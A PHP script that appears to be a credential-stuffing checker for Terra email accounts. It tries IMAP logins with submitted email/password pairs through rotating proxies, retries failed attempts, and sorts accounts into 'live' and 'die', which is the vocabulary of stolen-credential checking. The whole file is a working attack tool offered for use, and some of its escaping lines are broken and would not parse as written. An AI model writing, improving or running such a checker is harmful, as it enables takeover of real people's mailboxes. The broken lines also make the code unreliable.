<?php
error_reporting(0);
ini_set('display_errors', '0');
ini_set('max_execution_time', '120');
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

ob_start();

$action = $_GET['action'] ?? '';

// =========================================
//  INIT
// =========================================
if ($action === 'init') {
    $proxies = [];
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode("\n", $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            $proxies[] = $line;
        }
    }
    ob_clean();
    echo json_encode(['status' => 'ok', 'proxies' => array_values(array_unique($proxies))]);
    exit;
}

// =========================================
//  TEST_PROXY
// =========================================
if ($action === 'test_proxy') {
    $proxy = $_POST['proxy'] ?? '';
    if (empty($proxy)) {
        ob_clean();
        echo json_encode(['status' => 'fail']);
        exit;
    }
    $ok = testProxyHttps($proxy);
    ob_clean();
    echo json_encode(['status' => $ok ? 'ok' : 'fail']);
    exit;
}

// =========================================
//  DIAG_PROXY
// =========================================
if ($action === 'diag_proxy') {
    $proxy = $_POST['proxy'] ?? '';
    if (empty($proxy)) {
        ob_clean();
        echo json_encode(['status' => 'fail', 'msg' => 'Proxy vazio']);
        exit;
    }
    $p = parseProxy($proxy);
    $diag = ['proxy' => $proxy, 'parsed' => $p, 'steps' => []];

    // Step 1: HTTPS via cURL
    $ch = curl_init();
    @curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    @curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    @curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    @curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    @curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    @curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    if (!empty($p['user'])) {
        @curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
    $res = curl_exec($ch);
    $diag['steps']['https_curl'] = [
        'ok' => $res !== false,
        'ip' => $res !== false ? trim($res) : null,
        'err' => curl_error($ch),
        'errno' => curl_errno($ch),
    ];
    curl_close($ch);

    // Step 2: IMAP via cURL (provavelmente vai falhar)
    $ch2 = curl_init();
    @curl_setopt($ch2, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
    @curl_setopt($ch2, CURLOPT_USERNAME, 'test@test.com');
    @curl_setopt($ch2, CURLOPT_PASSWORD, 'test123');
    @curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
    @curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
    @curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    @curl_setopt($ch2, CURLOPT_TIMEOUT, 20);
    @curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT, 20);
    @curl_setopt($ch2, CURLOPT_NOSIGNAL, 1);
    @curl_setopt($ch2, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    @curl_setopt($ch2, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    @curl_setopt($ch2, CURLOPT_HTTPPROXYTUNNEL, true);
    if (!empty($p['user'])) {
        @curl_setopt($ch2, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
    $res2 = curl_exec($ch2);
    $diag['steps']['imap_curl'] = [
        'ok' => $res2 !== false,
        'errno' => curl_errno($ch2),
        'err' => curl_error($ch2),
    ];
    curl_close($ch2);

    // Step 3: IMAP via HTTP CONNECT manual
    $diag['steps']['imap_manual'] = testHttpConnectImap($proxy, 'test@test.com', 'test123', 20);

    ob_clean();
    echo json_encode($diag, JSON_PRETTY_PRINT);
    exit;
}

// =========================================
//  CHECK
// =========================================
if ($action === 'check') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $proxy = $_POST['proxy'] ?? '';
    if (empty($email) || empty($password)) {
        ob_clean();
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Vazio']);
        exit;
    }
    try {
        $result = doValidate($email, $password, $proxy);
    } catch (\Throwable $e) {
        $result = ['status' => 'die', 'email' => $email, 'reason' => 'Erro'];
    }
    ob_clean();
    echo json_encode($result);
    exit;
}

ob_clean();
echo json_encode(['status' => 'ok']);
exit;

// =========================================
//  PARSE PROXY
// =========================================
function parseProxy($proxy) {
    $host = '';
    $port = 0;
    $user = '';
    $pass = '';

    if (preg_match('#^(socks[45]h?|https?)://([^:@]+):([^@]+)@([^:]+):(\d+)$#i', $proxy, $m)) {
        $user = $m[2]; $pass = $m[3]; $host = $m[4]; $port = (int)$m[5];
    } elseif (preg_match('#^([^:@]+):([^@]+)@([^:]+):(\d+)$#', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    } elseif (preg_match('#^(socks[45]h?|https?)://([^:]+):(\d+)$#i', $proxy, $m)) {
        $host = $m[2]; $port = (int)$m[3];
    } elseif (preg_match('#^([^:]+):(\d+)$#', $proxy, $m)) {
        $host = $m[1]; $port = (int)$m[2];
    }

    return ['host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass];
}

// =========================================
//  TEST PROXY HTTPS (cURL)
// =========================================
function testProxyHttps($proxy) {
    if (!extension_loaded('curl')) return false;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return false;

    $ch = curl_init();
    @curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    @curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
    @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    @curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    @curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    @curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    @curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    if (!empty($p['user'])) {
        @curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
    $result = curl_exec($ch);
    curl_close($ch);
    return ($result !== false && strlen(trim($result)) > 0);
}

// =========================================
//  DO VALIDATE
// =========================================
function doValidate($email, $password, $proxy = '') {
    $timeout = 20;
    $delays = [0, 3000000, 6000000, 10000000, 15000000];

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        // COM proxy: HTTP CONNECT tunnel manual
        if (!empty($proxy)) {
            $r = tryHttpConnectImap($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;
        }

        // SEM proxy: cURL direto + socket direto
        if (empty($proxy)) {
            if (extension_loaded('curl')) {
                $r = tryCurlDirect($email, $password, $timeout);
                if ($r !== null) return $r;
            }
            $r = trySocketDirect($email, $password, $timeout);
            if ($r !== null) return $r;
        }
    }

    return ['status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true];
}

// =========================================
//  HTTP CONNECT TUNNEL + TLS + IMAP
//  Implementacao manual — contorna bug do
//  cURL IMAP com proxy HTTP CONNECT
// =========================================

function tryHttpConnectImap($email, $password, $timeout, $proxy) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) return null;

    // 1. Conectar ao proxy via TCP
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) return null;

    stream_set_timeout($socket, $timeout);

    // 2. Enviar HTTP CONNECT
    $target = 'imap.terra.com.br';
    $targetPort = 993;

    $connectReq = "CONNECT {$target}:{$targetPort} HTTP/1.1\r\n";
    $connectReq .= "Host: {$target}:{$targetPort}\r\n";

    // Autenticacao no proxy
    if (!empty($p['user'])) {
        $auth = base64_encode($p['user'] . ':' . $p['pass']);
        $connectReq .= "Proxy-Authorization: Basic {$auth}\r\n";
    }

    $connectReq .= "Proxy-Connection: Keep-Alive\r\n";
    $connectReq .= "\r\n";

    fwrite($socket, $connectReq);

    // 3. Ler resposta do proxy
    $response = '';
    $deadline = microtime(true) + $timeout;

    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        // Fim do header HTTP (linha vazia)
        if ($line === "\r\n" || $line === "\n") break;
    }

    // Verificar se o proxy estabeleceu o tunel
    if (stripos($response, '200') === false) {
        fclose($socket);
        return null;
    }

    // 4. Ativar TLS no socket
    $cryptoOk = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
    if ($cryptoOk !== true) {
        fclose($socket);
        return null;
    }

    // 5. Ler greeting IMAP
    $imapGreeting = @fgets($socket, 8192);
    if (!$imapGreeting || stripos($imapGreeting, 'OK') === false) {
        fclose($socket);
        return null;
    }

    // 6. IMAP LOGIN
    $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
    $safe_pass = str_replace(['\', '"'], ['\\', '\"'], $password);
    fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");

    // 7. Ler resposta
    $imapResponse = '';
    $deadline2 = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $imapResponse .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline2) break;
    }

    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);

    if (preg_match('/A1\s+OK/i', $imapResponse)) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    if (preg_match('/A1\s+NO/i', $imapResponse)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if (preg_match('/A1\s+BAD/i', $imapResponse)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    return null;
}

// =========================================
//  Funcao de diagnostico para diag_proxy
// =========================================
function testHttpConnectImap($proxy, $email, $password, $timeout) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) {
        return ['ok' => false, 'err' => 'Parse failed'];
    }

    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) {
        return ['ok' => false, 'err' => 'fsockopen failed: ' . $errstr];
    }

    stream_set_timeout($socket, $timeout);

    $target = 'imap.terra.com.br';
    $connectReq = "CONNECT {$target}:993 HTTP/1.1\r\n";
    $connectReq .= "Host: {$target}:993\r\n";
    if (!empty($p['user'])) {
        $auth = base64_encode($p['user'] . ':' . $p['pass']);
        $connectReq .= "Proxy-Authorization: Basic {$auth}\r\n";
    }
    $connectReq .= "Proxy-Connection: Keep-Alive\r\n\r\n";

    fwrite($socket, $connectReq);

    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if ($line === "\r\n" || $line === "\n") break;
    }

    if (stripos($response, '200') === false) {
        fclose($socket);
        return ['ok' => false, 'err' => 'CONNECT failed', 'response' => $response];
    }

    $cryptoOk = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
    if ($cryptoOk !== true) {
        fclose($socket);
        return ['ok' => false, 'err' => 'TLS failed'];
    }

    $greeting = @fgets($socket, 8192);
    if (!$greeting || stripos($greeting, 'OK') === false) {
        fclose($socket);
        return ['ok' => false, 'err' => 'No IMAP greeting', 'greeting' => $greeting];
    }

    $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
    $safe_pass = str_replace(['\', '"'], ['\\', '\"'], $password);
    fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");

    $imapResponse = '';
    $deadline2 = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $imapResponse .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline2) break;
    }

    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);

    return ['ok' => true, 'imap_response' => substr($imapResponse, 0, 500)];
}

// =========================================
//  CURL DIRETO (sem proxy)
// =========================================
function tryCurlDirect($email, $password, $timeout) {
    $ch = curl_init();
    @curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
    @curl_setopt($ch, CURLOPT_USERNAME, $email);
    @curl_setopt($ch, CURLOPT_PASSWORD, $password);
    @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    @curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    @curl_setopt($ch, CURLOPT_NOSIGNAL, 1);

    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);

    if ($errno === 67) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if ($result !== false) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    return null;
}

// =========================================
//  SOCKET DIRETO (sem proxy)
// =========================================
function trySocketDirect($email, $password, $timeout) {
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    $greeting = @fgets($socket, 8192);
    if (!$greeting || stripos($greeting, 'OK') === false) {
        fclose($socket);
        return null;
    }
    $safe_email = addslashes($email);
    $safe_pass = addslashes($password);
    fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");
    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline) break;
    }
    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);
    if (preg_match('/A1\s+OK/i', $response)) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    if (preg_match('/A1\s+NO/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if (preg_match('/A1\s+BAD/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    return null;
}
